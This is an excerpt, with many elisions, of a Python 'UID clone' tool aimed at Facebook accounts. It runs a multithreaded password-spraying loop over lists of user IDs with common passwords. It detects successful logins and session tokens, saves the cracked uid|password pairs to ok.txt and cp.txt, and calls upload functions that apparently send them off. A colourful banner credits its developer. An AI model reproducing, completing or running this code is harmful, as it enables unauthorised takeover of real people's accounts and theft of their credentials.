...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/username.ir.4")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Faisalabbasi001/2004-2005/blob/main/trick.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;93m $$______ _$$_$$__ _$$__ $$___$$_ _$$_$$__ $$______
\033[1;94m $$$$$___ $$___$$_ _$$__ _$$$____ $$___$$_ $$______
\033[1;95m $$______ $$$$$$$_ _$$__ ___$$$__ $$$$$$$_ $$______
\033[1;96m $$______ $$___$$_ _$$__ $$___$$_ $$___$$_ $$____$_
\033[1;92m $$______ $$___$$_ $$$$_ _$$$$$__ $$___$$_ $$$$$$$_

\033[1;94m𝐔𝐩𝐝𝐚𝐭𝐞 \033[1;93m𝐃𝐚𝐭𝐞 \033[1;95m 4\033[1;96m 𝐎𝐜𝐭\033[1;92m 2022    \033[1;93m 𝐁𝐑𝐎 \033[1;96m𝐈\033[1;91m 𝐀𝐌\033[1;94m 𝐅𝐀𝐈𝐒𝐀𝐋

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :       \033[1;95m     𝐅𝐀𝐈𝐒𝐀𝐋𝐀𝐁𝐁𝐀𝐒𝐈𝟎𝟎𝟏
     \033[1;91m➣ \033[1;92mFACEBOOK   :         \033[1;96m   𝐅𝐀𝐈𝐒𝐀𝐋
     \033[1;93m➣ \033[1;92mWHATSAPP   :      \033[1;91m      𝐒𝐎𝐑𝐑𝐘 𝐁𝐑𝐎
     \033[1;96m➣ \033[1;92mGITHUB     :         \033[1;93m   𝐅𝐀𝐈𝐒𝐀𝐋𝐀𝐁𝐁𝐀𝐒𝐈𝟎𝟎𝟏
     \033[1;95m➣ \033[1;92mTOOLS      :       \033[1;98m     𝐎𝐋𝐃 𝐂𝐋𝐎𝐍𝐄
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [%sA%s] %sTOOL NAME : \033[1;91m %sUID CLON"%(G,R,G,Y,G))
		print("%s [%sB%s] %sVERSION   : \033[1;93m %s1.0"%(G,R,G,Y,G))
		print("%s [%sC%s] %sYOUR KEY  : \033[1;96m %s%s"%(G,R,G,Y,G,key))
		print("%s [%sD%s] %sSTATUS    : \033[1;94m %s"%(G,R,G,Y,stat)) 
		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR HASAN  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:HASAN ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [HASAN] : \033[0;97m %s/%s -> \033[0;92m [HASAN -OK:%s ]- \033[0;93m[HASAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HASAN-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [HASAN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HASAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [HASAN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
